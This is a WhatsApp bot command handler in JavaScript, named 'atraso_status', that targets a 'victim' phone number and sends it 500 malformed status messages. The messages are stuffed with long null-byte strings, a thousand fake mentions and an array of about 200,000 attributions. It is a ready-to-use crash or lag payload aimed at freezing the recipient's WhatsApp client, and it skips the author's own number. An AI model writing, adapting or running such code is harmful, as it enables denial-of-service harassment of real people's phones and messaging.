let handler = async (m, { conn, text, command }) => {
  // 1. Verificar argumento
  if (!text) return m.reply(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-6591'`);

  // 2. Declarar y procesar el número correctamente
  let victim = text.split("|")[0].trim();
  
  // Lógica para obtener el JID del contacto
  let Xreturn;
  if (m.mentionedJid && m.mentionedJid[0]) {
    Xreturn = m.mentionedJid[0];
  } else if (m.quoted && m.quoted.sender) {
    Xreturn = m.quoted.sender;
  } else {
    // Limpiar el número: quitar espacios, guiones, paréntesis y el símbolo +
    let cleanNumber = victim.replace(/[\s\-\(\)\+]/g, '');
    // Asegurar que tenga el formato de JID
    Xreturn = cleanNumber + "@s.whatsapp.net";
  }

  // 3. Verificar contacto
  let contactInfo = await conn.onWhatsApp(Xreturn);
  
  // Verificaciones de bloqueo (puedes ajustar o quitar estas líneas si no las necesitas)
  if (victim == "555189926591") return;
  if (victim == "+55 51 8992-6591") return;

  if (contactInfo.length == 0) {
    return m.reply("esse número não existe");
  }

  m.reply("*enviando....*");  

  // 4. Ejecutar el envío
  for (let i = 0; i < 500; i++) {
    await external_share(Xreturn);
  }
  
  m.reply("*✔️*");
};

// Función auxiliar corregida
async function external_share(target) {
  try {
    // Asegúrate de que 'generateWAMessageFromContent' esté definida en tu entorno
    let msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ 
              flow_cta: "\u0000".repeat(9999)
            }),
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1000 }, (_, y) => `555193871982${y + 1}@s.whatsapp.net`),
            remoteJid: "status@broadcast",
            statusAttributionType: "RESHARED_FROM_POST",
            isQuestion: true,
            statusAttributions: Array(199999).fill({ type: "EXTERNAL_SHARE" })
          }
        }
      },
      {}
    );
    
    await conn.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  } catch (error) {
    console.log(error);
  }
}

handler.command = ['atraso_status'];
handler.tags = ['fake', 'grupo'];
handler.help = ['atraso_status <número>'];

export default handler;
